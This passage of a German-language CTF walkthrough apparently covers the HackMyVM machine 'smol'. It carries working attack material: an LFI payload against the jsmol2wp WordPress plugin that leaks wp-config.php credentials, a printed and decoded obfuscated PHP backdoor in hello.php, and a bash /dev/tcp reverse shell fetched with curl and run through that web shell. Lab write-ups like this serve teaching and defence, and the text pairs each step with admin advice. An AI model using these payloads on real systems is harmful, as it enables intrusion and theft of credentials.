+            <p class="evaluation">**Bewertung:** Obwohl die Syntax für die POST-Daten (`user=^USER^...`) falsch für XML-RPC ist, scheint Hydra trotzdem Anfragen zu senden und auf die `incorrect`-Fehlermeldung zu reagieren. Die angezeigte Ausgabe zeigt nur Fehlversuche für die Benutzer `gege`, `diego` und `xavi` mit einigen Beispielpasswörtern. Die abschließende Meldung `<span class="password">1 of 1 target successfully completed, 32 valid passwords found</span>` steht im Widerspruch zur angezeigten Ausgabe und ist wahrscheinlich ein Fehler von Hydra oder eine Fehlinterpretation der Ausgabe, da die spezifischen gefundenen Passwörter nicht aufgelistet werden. Es ist unwahrscheinlich, dass bei dieser falschen Syntax tatsächlich Passwörter gefunden wurden. Der Ansatz über die LFI-Schwachstelle ist vielversprechender.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Korrigieren Sie die Hydra-Syntax, um eine gültige XML-RPC-Anfrage (z.B. für `wp.getUsersBlogs`) zu senden, falls der LFI-Weg nicht funktioniert. Konzentrieren Sie sich jedoch zuerst auf die LFI-Schwachstelle im `jsmol2wp`-Plugin, da diese bereits Hinweise auf Erfolg liefert.<br>**Empfehlung (Admin):** Absicherung von XML-RPC durch Deaktivierung oder Ratenbegrenzung/Fail2Ban, um Brute-Force-Angriffe zu verhindern.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt
+
+http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php
+?isform=true
+&amp;call=getRawDataFromDatabase
+&amp;query=php://filter/resource=../../../../wp-config.php</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Dieser Abschnitt zeigt einen Link zu einer Advisory-Datei auf GitHub, die die Schwachstellen CVE-2018-20463 (SSRF/LFI) und CVE-2018-20462 (XSS) im `jsmol2wp`-Plugin beschreibt. Darunter wird der spezifische Payload für die LFI-Schwachstelle aufgeschlüsselt.</p>
+            <p class="evaluation">**Bewertung:** Dies liefert den entscheidenden Hinweis auf den korrekten Pfad und die Parameter zur Ausnutzung der LFI-Schwachstelle:
+*   Pfad: `/wp-content/plugins/jsmol2wp/php/jsmol.php`
+*   Parameter: `isform=true`, `call=getRawDataFromDatabase`
+*   LFI-Parameter: `query`
+*   Payload: `php://filter/resource=../../../../[DATEIPFAD]` - Der `php://filter`-Wrapper wird verwendet, um Dateiinhalte zu lesen, auch wenn die direkte Einbindung als PHP-Code fehlschlägt. `../../../../` wird verwendet, um aus dem Plugin-Verzeichnis in das WordPress-Hauptverzeichnis und darüber hinaus zu navigieren.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie diesen exakten Pfad und diese Parameterstruktur, um die LFI-Schwachstelle auszunutzen. Beginnen Sie damit, die `wp-config.php` zu lesen, um Datenbank-Zugangsdaten zu erhalten.<br>**Empfehlung (Admin):** Die Deinstallation des Plugins ist die beste Lösung. Ansonsten würde eine Web Application Firewall (WAF) helfen, die verdächtige Muster wie `php://filter` in Anfragen erkennt.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -s 'http://www.smol.hmv/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&amp;call=getRawDataFromDatabase&amp;query=php://filter/resource=../../../../wp-config.php'</span></div>
+                     <pre>&lt; 
+/**
+
+
+// ** Database settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', '<span class="command">wordpress</span>' );
+
+/** Database username */
+define( 'DB_USER', '<span class="command">wpuser</span>' );
+
+/** Database password */
+define( 'DB_PASSWORD', '<span class="password">kbLSF2Vop#lw3rjDZ629*Z%G</span>' );
+
+/** Database hostname */
+define( 'DB_HOST', '<span class="command">localhost</span>' );
+
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', '<span class="command">utf8</span>' );</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Dieser `curl`-Befehl nutzt die zuvor identifizierte LFI-Schwachstelle (CVE-2018-20463) im `jsmol2wp`-Plugin. Es wird der korrekte Pfad (`/wp-content/plugins/jsmol2wp/php/jsmol.php`) und die Parameter (`isform=true`, `call=getRawDataFromDatabase`) verwendet. Der `query`-Parameter enthält den LFI-Payload `php://filter/resource=../../../../wp-config.php`, der versucht, die WordPress-Konfigurationsdatei zu lesen.</p>
+            <p class="evaluation">**Bewertung:** Fantastisch! Der Angriff ist erfolgreich! Die Ausgabe zeigt den Inhalt der `wp-config.php`-Datei. Dies ist ein kritischer Informationsgewinn, da die Datei die Zugangsdaten zur WordPress-Datenbank enthält:
+*   Datenbankname: `wordpress`
+*   Benutzer: `wpuser`
+*   Passwort: `kbLSF2Vop#lw3rjDZ629*Z%G`
+*   Host: `localhost`
+Mit diesen Zugangsdaten kann potenziell auf die Datenbank zugegriffen werden, um weitere Informationen (z.B. Benutzer-Hashes) zu extrahieren.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Speichern Sie die             Datenbank-Zugangsdaten sicher. Versuchen Sie als Nächstes, sich mit diesen Daten am MySQL-Server anzumelden (der auf `localhost` läuft, also vom Webserver aus erreichbar sein sollte).<br>**Empfehlung (Admin):** **Sofort das Plugin `jsmol2wp` deinstallieren!** Ändern Sie umgehend das Datenbankpasswort in der `wp-config.php` und in der MySQL-Datenbank. Überprüfen Sie die Datenbank auf unbefugte Änderungen oder hinzugefügte Benutzer.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>Wir konnten uns einloggen, aber der User hat kaum Privilegien weshalb wir weiter FUZZEN müssen</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Dies ist eine Notiz des Pentesters. Sie deutet darauf hin, dass ein vorheriger (nicht im Text gezeigter) Login-Versuch (möglicherweise ins WordPress-Backend mit einem der geknackten Passwörter oder über SSH mit einem Standardpasswort) zwar erfolgreich war, der erlangte Benutzer jedoch nur geringe Rechte hatte. Daher wird die LFI-Schwachstelle weiter untersucht, um nach höher privilegierten Zielen oder Dateien zu suchen.</p>
+             <p class="evaluation">**Bewertung:** Zeigt den iterativen Prozess des Pentestings. Wenn ein Weg nicht direkt zum Ziel führt (z.B. geringe Rechte), werden andere gefundene Schwachstellen (hier die LFI) weiter exploriert.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Korrekt, die LFI ist ein vielversprechender Vektor. Nutzen Sie sie, um nach weiteren Konfigurationsdateien, Skripten mit potenziellen Backdoors oder anderen sensiblen Informationen zu suchen.<br>**Empfehlung (Admin):** Zeigt, wie wichtig es ist, alle gefundenen Schwachstellen zu beheben, auch wenn sie nicht sofort zu vollem Zugriff führen. Ein Angreifer wird oft mehrere Wege parallel verfolgen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ffuf -ic -c -u 'http://www.smol.hmv/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../FUZZ' -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -fs 2</span></div>
+                     <pre>
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://www.smol.hmv/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 2
+________________________________________________
+
+<span class="command">wp-content/plugins/hello.php</span> [Status: 200, Size: 2704, Words: 321, Lines: 104, Duration: 0ms]
+:: Progress: [13370/13370] :: Job [1/1] :: 53 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+                        </pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Hier wird `ffuf`, ein weiteres Fuzzing-Tool ähnlich wie Gobuster, verwendet, um die LFI-Schwachstelle auszunutzen und nach existierenden Dateien zu suchen.
+*   `-u '.../../../../../FUZZ'`: Die URL enthält den LFI-Payload, wobei `FUZZ` der Platzhalter ist, den `ffuf` durch Wörter aus der Wortliste ersetzt.
+*   `-w .../wp-plugins.fuzz.txt`: Als Wortliste wird eine spezifische Liste verwendet, die gängige Plugin-Pfade/Dateien in WordPress enthält.
+*   `-ic`: Ignoriert Kommentare in der Wortliste.
+*   `-c`: Farbausgabe.
+*   `-fs 2`: Filtert Antworten heraus, deren Größe (Size) genau 2 Bytes beträgt. Dies ist nützlich, um leere oder sehr kleine Fehlerseiten auszublenden, die bei nicht gefundenen Dateien auftreten könnten.</p>
+            <p class="evaluation">**Bewertung:** Der Fuzzing-Versuch ist erfolgreich und identifiziert die Datei `wp-content/plugins/hello.php`. Dies ist interessant, da "Hello Dolly" (die übliche `hello.php` in WordPress) normalerweise harmlos ist. Der Fund deutet darauf hin, dass diese Datei entweder modifiziert wurde oder eine andere, gleichnamige Datei existiert.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Lesen Sie den Inhalt der gefundenen Datei `wp-content/plugins/hello.php` mithilfe der LFI-Schwachstelle, um zu sehen, ob sie modifiziert wurde oder unerwarteten Code enthält.<br>**Empfehlung (Admin):** Überwachen Sie Dateisystemänderungen (File Integrity Monitoring), um unerwartete oder modifizierte Dateien in Plugin-Verzeichnissen zu erkennen. Entfernen Sie ungenutzte Plugins vollständig.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre> Wir können sehen, dass das Hello Dolly -Plugin installiert ist, lesen Sie diese Datei.</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Eine Notiz des Pentesters, die den Fund aus dem `ffuf`-Scan zusammenfasst und den nächsten Schritt ankündigt.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt den Plan, die gefundene Datei zu untersuchen.</p>
+             <p class="recommendation">**Empfehlung (Pentester/Admin):** Keine Aktion erforderlich.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -s 'http://www.smol.hmv/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php'</span></div>
+                     <pre>
+ 
+/**
+ * @package Hello_Dolly
+ * @version 1.7.2
+ */
+/*
+Plugin Name: Hello Dolly
+Plugin URI: http://wordpress.org/plugins/hello-dolly/
+Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
+Author: Matt Mullenweg
+Version: 1.7.2
+Author URI: http://ma.tt/
+*/
+
+function hello_dolly_get_lyric() {
+	/** These are the lyrics to Hello Dolly */
+	$lyrics = "Hello, Dolly
+Well, hello, Dolly
+It's so nice to have you back where you belong
+You're lookin' swell, Dolly
+I can tell, Dolly
+You're still glowin', you're still crowin'
+You're still goin' strong
+I feel the room swayin'
+While the band's playin'
+One of our old favorite songs from way back when
+So, take her wrap, fellas
+Dolly, never go away again
+Hello, Dolly
+Well, hello, Dolly
+It's so nice to have you back where you belong
+You're lookin' swell, Dolly
+I can tell, Dolly
+You're still glowin', you're still crowin'
+You're still goin' strong
+I feel the room swayin'
+While the band's playin'
+One of our old favorite songs from way back when
+So, golly, gee, fellas
+Have a little faith in me, fellas
+Dolly, never go away
+Promise, you'll never go away
+Dolly'll never go away again";
+
+	// Here we split it into lines.
+	$lyrics = explode( "\n", $lyrics );
+
+	// And then randomly choose a line.
+	return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
+}
+
+// This just echoes the chosen line, we'll position it later.
+function hello_dolly() {
+	<span class="password">eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));</span>
+
+	$chosen = hello_dolly_get_lyric();
+	$lang   = '';
+	if ( 'en_' !== substr( get_user_locale(), 0, 3 ) ) {
+		$lang = ' lang="en"';
+	}
+
+	printf(
+		'<p id="dolly"><span class="screen-reader-text">%s </span><span dir="ltr"%s>%s</span></p>',
+		__( 'Quote from Hello Dolly song, by Jerry Herman:' ),
+		$lang,
+		$chosen
+	);
+}
+
+// Now we set that function up to execute when the admin_notices action is called.
+add_action( 'admin_notices', 'hello_dolly' );
+
+// We need some CSS to position the paragraph.
+function dolly_css() {
+	echo "
+	#dolly {
+		float: right;
+		padding: 5px 10px;
+		margin: 0;
+		font-size: 12px;
+		line-height: 1.6666;
+	}
+	.rtl #dolly {
+		float: left;
+	}
+	.block-editor-page #dolly {
+		display: none;
+	}
+	@media screen and (max-width: 782px) {
+		#dolly,
+		.rtl #dolly {
+			float: none;
+			padding-left: 0;
+			padding-right: 0;
+		}
+	}
+	";
+}
+
+add_action( 'admin_head', 'dolly_css' );
+
+</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Die LFI-Schwachstelle wird nun genutzt, um den Quellcode der Datei `wp-content/plugins/hello.php` zu lesen.</p>
+            <p class="evaluation">**Bewertung:** Volltreffer! Der Quellcode der `hello.php` wurde erfolgreich ausgelesen. Der Code entspricht größtenteils dem harmlosen Standard-"Hello Dolly"-Plugin, ABER er enthält eine zusätzliche, stark verschleierte Zeile:
+`eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));`
+Dies ist eine PHP-Backdoor. `base64_decode` entschlüsselt den String, und `eval()` führt den resultierenden PHP-Code aus. Dies ermöglicht Remote Code Execution (RCE).</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Dekodieren Sie den Base64-String, um die genaue Funktionsweise der Backdoor zu verstehen. Nutzen Sie diese Backdoor, um Befehle auf dem Server auszuführen, mit dem Ziel, eine interaktive Reverse Shell zu erhalten.<br>**Empfehlung (Admin):** Diese modifizierte `hello.php` ist eindeutig bösartig und muss sofort entfernt werden. Untersuchen Sie das System auf weitere Kompromittierungsanzeichen. Implementieren Sie File Integrity Monitoring, um solche Änderungen in Zukunft zu erkennen. Überprüfen Sie, wie diese Datei modifiziert werden konnte (z.B. durch eine andere Schwachstelle oder kompromittierte Zugangsdaten).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">echo "CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | base64 -d</span></div>
+                     <pre> if (isset($GET["\143\155\x64"])) { system($GET["\143\x6d\144"]); }   </pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Der Base64-kodierte String aus der `hello.php`-Backdoor wird mittels `echo` an den `base64 -d`-Befehl übergeben, der ihn dekodiert.</p>
+            <p class="evaluation">**Bewertung:** Der dekodierte Code lautet: `if (isset($GET["\143\155\x64"])) { system($GET["\143\x6d\144"]); }`. Die oktalen (`\143`, `\155`, `\144`) und hexadezimalen (`\x6d`, `\x64`) Escape-Sequenzen repräsentieren ASCII-Zeichen. Wenn man sie dekodiert (`\143`=c, `\155`=m, `\x64`=d, `\x6d`=m), ergibt sich: `if (isset($GET["cmd"])) { system($GET["cmd"]); }`. Dies ist eine klassische Web-Shell: Wenn ein GET-Parameter namens `cmd` in der URL übergeben wird, wird dessen Wert direkt an die PHP-Funktion `system()` übergeben, die den Wert als Betriebssystembefehl ausführt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Sie haben nun eine bestätigte RCE-Schwachstelle. Rufen Sie die URL `http://www.smol.hmv/wp-content/plugins/hello.php` (oder möglicherweise `/wp-admin/`, da die Funktion über `add_action('admin_notices', ...)` eingebunden wird) auf und hängen Sie `?cmd=[BEFEHL]` an, um Befehle auszuführen. Beginnen Sie mit einfachen Befehlen wie `id` oder `whoami`, um die Ausführung zu bestätigen, und versuchen Sie dann, eine Reverse Shell zu etablieren.<br>**Empfehlung (Admin):** Entfernen Sie die Backdoor sofort. Diese Art von Code-Injection ist extrem gefährlich.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">printf "\143\155\x64"</span></div>
+                     <pre>cmd   </pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Der `printf`-Befehl wird hier verwendet, um die oktalen und hexadezimalen Escape-Sequenzen aus dem dekodierten Backdoor-Code in die entsprechenden ASCII-Zeichen umzuwandeln.</p>
+            <p class="evaluation">**Bewertung:** Dies bestätigt, dass `\143\155\x64` dem String `cmd` entspricht. Dies ist der Name des GET-Parameters, den die Backdoor erwartet.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie `cmd` als Parameternamen, wenn Sie die RCE-Schwachstelle ausnutzen.<br>**Empfehlung (Admin):** Irrelevant für die Verteidigung, dient nur der Analyse des Angreifers.</p>
+
+        </section>
+
+        <section id="proof-of-concept">
+            <h2>Proof of Concept (LFI/RCE)</h2>
+            <p class="comment">**Kurzbeschreibung:** Die folgende Sequenz demonstriert die Ausnutzung der kombinierten Local File Inclusion (LFI) Schwachstelle im 'jsmol2wp' Plugin (CVE-2018-20463) und der daraus resultierenden Remote Code Execution (RCE) durch eine modifizierte 'hello.php' Datei, um initialen Zugriff auf das System als Benutzer 'www-data' zu erlangen.</p>
+            <p class="comment">**Voraussetzungen:** Zugriff auf das Webinterface (Port 80), Kenntnis der LFI-Schwachstelle und der Backdoor in `hello.php`, ein laufender Netcat-Listener auf dem Angreifersystem.</p>
+            <p class="comment">**Schritt-für-Schritt-Anleitung:**</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
+└─# <span class="command">curl -s 'http://www.smol.hmv/wp-content/plugins/hello.php?cmd=id'</span></div>
+                     <pre>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre> <span class="comment"> <-- Mögliche erwartete Ausgabe, die aber nicht kam</span>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Erster Versuch, die RCE-Backdoor auszunutzen. `curl` wird verwendet, um die URL der `hello.php`-Datei aufzurufen und den Parameter `cmd=id` anzuhängen. `-s` unterdrückt die curl-Ausgabe.</p>
+             <p class="evaluation">**Bewertung:** In diesem Log scheint keine direkte Ausgabe des `id`-Befehls erfolgt zu sein. Dies könnte daran liegen, dass die `hello_dolly`-Funktion, die den `eval()`-Aufruf enthält, nur im WordPress-Admin-Bereich (`admin_notices`-Hook) ausgeführt wird. Ein direkter Aufruf der `hello.php` triggert die Backdoor möglicherweise nicht.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, die RCE über eine URL auszuführen, die den `admin_notices`-Hook auslöst, z.B. eine Seite im `/wp-admin/`-Bereich, auch wenn Sie nicht eingeloggt sind (manche Hooks feuern trotzdem). Hängen Sie `?cmd=id` an eine Admin-URL an.<br>**Empfehlung (Admin):** Entfernen der Backdoor.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
+└─# <span class="command">curl -s 'http://www.smol.hmv/wp-content/plugins/hello.php?cmd=id' -I</span></div>
+                     <pre>
+HTTP/1.0 <span class="password">500 Internal Server Error</span>
+Date: Mon, 10 Feb 2025 23:24:15 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Connection: close
+Content-Type: text/html; charset=UTF-8</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Derselbe RCE-Versuch wie zuvor, aber mit der Option `-I`, um nur die HTTP-Header anzufordern.</p>
+             <p class="evaluation">**Bewertung:** Der Server antwortet mit `500 Internal Server Error`. Dies ist oft ein Zeichen dafür, dass bei der serverseitigen Verarbeitung (dem PHP-Skript) ein Fehler aufgetreten ist. Es könnte sein, dass der `system()`-Aufruf fehlschlägt oder die direkte Ausführung der Datei Probleme verursacht, aber es bestätigt nicht, dass der Befehl ausgeführt wurde.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Bestätigt, dass der direkte Aufruf der `hello.php` wahrscheinlich nicht der richtige Weg ist. Versuchen Sie die Ausführung über eine Admin-URL.<br>**Empfehlung (Admin):** Serverfehler sollten untersucht werden, aber in diesem Fall ist die Ursache die Backdoor, die entfernt werden muss.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">echo 'bash -c "/bin/bash -i >& /dev/tcp/192.168.2.199/4444 0>&1"' > rever.sh</span></div>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Erstellt eine Datei namens `rever.sh` auf dem Angreifer-System. Diese Datei enthält einen Standard-Bash-Befehl zum Aufbau einer Reverse Shell. Der Befehl öffnet eine interaktive Bash-Shell (`/bin/bash -i`) und leitet deren Standard-Input, Standard-Output und Standard-Error (`>& ... 0>&1`) über eine TCP-Verbindung (`/dev/tcp/...`) an die IP-Adresse des Angreifers (`192.168.2.199`) auf Port `4444` um.</p>
+             <p class="evaluation">**Bewertung:** Dies ist eine Vorbereitung, um die RCE-Schwachstelle zu nutzen, um nicht nur einzelne Befehle auszuführen, sondern eine dauerhafte, interaktive Shell auf dem Zielsystem zu erhalten. Das Auslagern in ein Skript erleichtert das Hochladen und Ausführen auf dem Ziel.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Stellen Sie sicher, dass die IP-Adresse (`192.168.2.199`) und der Port (`4444`) korrekt sind und auf dem Angreifer-System ein Listener (z.B. `nc -lvnp 4444`) auf diesem Port gestartet wird, bevor das Skript auf dem Ziel ausgeführt wird.<br>**Empfehlung (Admin):** Ausgehende Verbindungen vom Webserver sollten auf das Notwendigste beschränkt werden (Egress Filtering), um den Aufbau von Reverse Shells zu erschweren. Intrusion Detection Systeme können verdächtige ausgehende Verbindungen erkennen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>listening on [any] 4444 ...</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Startet einen Netcat-Listener auf dem Angreifer-System. `-l` weist Netcat an, zu lauschen (listen). `-v` sorgt für eine ausführliche Ausgabe. `-n` verhindert DNS-Lookups. `-p 4444` gibt den Port an, auf dem gelauscht wird.</p>
+             <p class="evaluation">**Bewertung:** Der Listener ist nun bereit, die eingehende Verbindung von der Reverse Shell entgegenzunehmen, sobald das `rever.sh`-Skript auf dem Zielsystem ausgeführt wird.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Halten Sie dieses Terminalfenster offen und warten Sie auf die eingehende Verbindung.<br>**Empfehlung (Admin):** Keine direkte Maßnahme, aber die Überwachung verdächtiger eingehender Verbindungen auf dem Angreifer-System ist Teil des Incident Response.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+http://www.smol.hmv/wp-admin/?cmd=id
+
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+
+
+http://www.smol.hmv/wp-admin/?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F4444%200%3E%261%27
+http://www.smol.hmv/wp-admin/?cmd=which+nc -e /bin/sh 192.168.2.199 4444
+
+kann alles lesen aber keine shell aufbauen
+
+http://www.smol.hmv/wp-admin/?cmd=curl 192.168.2.199/rever.sh -o /tmp/rev.sh
+
+http://www.smol.hmv/wp-admin/?cmd=ls /tmp
+
+<span class="command">rev.sh</span>
+
+
+hat geklappt
+
+
+http://www.smol.hmv/wp-admin/?cmd=bash%20/tmp/rev.sh</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Dieser Block beschreibt die erfolgreichen Versuche, die RCE über den `/wp-admin/`-Pfad auszuführen, wahrscheinlich durch Aufrufen dieser URLs im Browser des Angreifers.
+1.  `.../wp-admin/?cmd=id`: Bestätigt, dass die RCE funktioniert, indem die Benutzer-ID (`www-data`) zurückgegeben wird (obwohl die Ausgabe hier nur notiert ist).
+2.  `.../wp-admin/?cmd=...reverse shell...`: Versuche, die Reverse Shell direkt über die URL zu starten. Die URL-Kodierung (`%2F` für `/`, `%20` für Leerzeichen, etc.) ist korrekt. Die Notiz "kann alles lesen aber keine shell aufbauen" deutet darauf hin, dass diese direkten Versuche fehlschlugen, möglicherweise wegen Zeichenbeschränkungen, Timeouts oder weil der Webserver-Prozess die Shell nicht korrekt starten konnte.
+3.  `.../wp-admin/?cmd=curl ... -o /tmp/rev.sh`: Nutzt die RCE, um das zuvor erstellte `rever.sh`-Skript vom Webserver des Angreifers herunterzuladen und im `/tmp`-Verzeichnis des Zielsystems zu speichern.
+4.  `.../wp-admin/?cmd=ls /tmp`: Bestätigt, dass der Download erfolgreich war und `rev.sh` im `/tmp`-Verzeichnis liegt.
+5.  `.../wp-admin/?cmd=bash%20/tmp/rev.sh`: Nutzt die RCE, um das heruntergeladene Skript mit Bash auszuführen.</p>
+            <p class="evaluation">**Bewertung:** Dies ist ein klassischer Weg zur Eskalation von RCE zu einer interaktiven Shell. Die Unfähigkeit, die Shell direkt zu starten, wird durch das Hochladen und Ausführen eines separaten Skripts umgangen. Der Download und die anschließende Ausführung waren erfolgreich.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Überprüfen Sie das Netcat-Listener-Fenster. Nach Ausführung des letzten Befehls sollte dort eine Verbindung eingehen.<br>**Empfehlung (Admin):** Verhindern Sie die Ausführung von Skripten aus Verzeichnissen wie `/tmp` (`noexec`-Mount-Option). Beschränken Sie die Fähigkeiten des Webserver-Benutzers (`www-data`), ausgehende Verbindungen herzustellen oder Dateien herunterzuladen. Entfernen Sie die RCE-Backdoor.</p>
+
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.164] 56438</span>
+bash: cannot set terminal process group (827): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="prompt">www-data@smol:/var/www/wordpress/wp-admin$</span> </pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Der Netcat-Listener auf dem Angreifer-System zeigt eine eingehende Verbindung von der IP-Adresse des Ziels (`192.168.2.164`) auf Port 4444. Die Fehlermeldungen (`cannot set terminal process group`, `no job control`) sind typisch für einfache Reverse Shells, die kein vollwertiges Pseudo-Terminal (PTY) haben. Wichtig ist, dass ein Prompt (`www-data@smol:...$`) erscheint.</p>
+            <p class="evaluation">**Bewertung:** Fantastisch, der initiale Zugriff war erfolgreich! Wir haben nun eine interaktive Shell auf dem Zielsystem als Benutzer `www-data`, der Benutzer unter dem der Apache-Webserver läuft. Die Shell ist noch rudimentär, aber funktionsfähig.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Stabilisieren Sie die Shell, um Funktionalität wie Job Control, Tab-Vervollständigung und korrekte Terminal-Größenanpassung zu erhalten. Gängige Methoden beinhalten Python PTY-Spawning (`python -c 'import pty;pty.spawn("/bin/bash")'`), `script /dev/null -c bash`, und die Verwendung von `stty raw -echo; fg`. Führen Sie danach grundlegende Enumerationsbefehle aus (`id`, `whoami`, `pwd`, `ls -la`, `sudo -l`).<br>**Empfehlung (Admin):** Wenn eine solche Verbindung entdeckt wird (z.B. durch Netzwerküberwachung oder Logs), muss der Vorfall sofort untersucht, die Kompromittierung bestätigt und das betroffene System isoliert werden.</p>
+
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@smol:/var/www/wordpress/wp-admin$ <span class="command">stty rows 47 columns 94</span></div>
+                     <div class="prompt">www-data@smol:/var/www/wordpress/wp-admin$ <span class="command">id</span></div>
+                     <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+                     <div class="prompt">www-data@smol:/var/www/wordpress/wp-admin$ </div>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Innerhalb der Reverse Shell werden zwei Befehle ausgeführt:
+1.  `stty rows 47 columns 94`: Versucht, die Zeilen- und Spaltenanzahl des Terminals auf der Zielseite an die des Angreifer-Terminals anzupassen. Dies verbessert die Darstellung von Programmen wie Texteditoren oder `less`. Die Werte 47/94 müssen zur Größe des Angreifer-Terminals passen.
+2.  `id`: Zeigt die Benutzer- und Gruppen-IDs des aktuellen Benutzers an.</p>
+            <p class="evaluation">**Bewertung:** Der `stty`-Befehl ist ein Schritt zur Shell-Stabilisierung. Der `id`-Befehl bestätigt, dass wir als Benutzer `www-data` (UID 33) mit der Gruppe `www-data` (GID 33) agieren. Dies ist ein niedrig privilegierter Benutzer, der typischerweise für Webserver verwendet wird.</p>
